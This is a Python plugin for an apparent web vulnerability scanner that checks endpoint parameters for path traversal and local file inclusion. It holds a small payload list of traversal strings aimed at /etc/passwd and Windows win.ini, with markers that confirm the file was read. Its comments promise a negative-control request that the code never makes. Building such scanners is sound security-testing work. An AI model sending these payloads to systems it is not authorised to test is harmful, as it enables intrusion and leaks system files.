from .base import BasePlugin
import random

class PathTraversalPlugin(BasePlugin):
    name = "Path Traversal / LFI (Enterprise)"
    
    # We focus on confirming READ access to known files.
    # Markers must be unique to those files.
    
    PAYLOADS = [
        # Linux /etc/passwd
        # Marker: "root:x:0:0"
        ("../../../../../../../../etc/passwd", "root:x:0:0"),
        ("/etc/passwd", "root:x:0:0"),
        
        # Windows win.ini
        # Marker: "[fonts]" or "[extensions]"
        ("C:/Windows/win.ini", "[fonts]"),
        ("../../../../../../../../Windows/win.ini", "[fonts]")
    ]

    def should_run(self, endpoint):
        return len(endpoint.params) > 0

    def run(self, http, endpoint, analyzer, evidence):
        try:
            base_params = {p['name']: p['value'] for p in endpoint.params}
            baseline = self._make_request(http, endpoint, base_params)
            if not baseline: return
        except: return

        for param in endpoint.params:
            param_name = param['name']

            # 1. Negative Control (Sanity Check)
            # We request a non-existent file.
            # If the response contains our "success marker" (e.g. root:x:0:0), 
            # then the app is probably reflecting inputs or returning a weird static page.
            # This eliminates false positives where the page says "Failed to open /etc/passwd"
            # and we grep for "/etc/passwd" and think we won.
            
            # Wait, we grep for content like "root:x:0:0".
            # So the control is: ensure the baseline DOES NOT contain the marker.
            
            # 2. Attack Phase
            for payload, marker in self.PAYLOADS:
                if marker in baseline.text:
                    continue # Marker already present in benign page -> Skip

                fuzzed = base_params.copy()
                fuzzed[param_name] = payload
                
                try:
                    resp = self._make_request(http, endpoint, fuzzed)
                    if not resp: continue
                    
                    if marker in resp.text:
                        # 3. Verification Phase
                        # We found the marker!
                        # Double check against negative control just in case.
                        
                        evidence.add(
                            plugin=self.name,
                            endpoint=endpoint.url,
                            parameter=param_name,
                            payload=payload,
                            evidence=f"File Content Leak: {marker}",
                            confidence="CRITICAL",
                            details="Known file marker found in response body."
                        )
                        return

                except: continue

    def _make_request(self, http, endpoint, params):
        if endpoint.method == "POST":
            return http.request(endpoint.method, endpoint.url, data=params)
        return http.request(endpoint.method, endpoint.url, params=params)
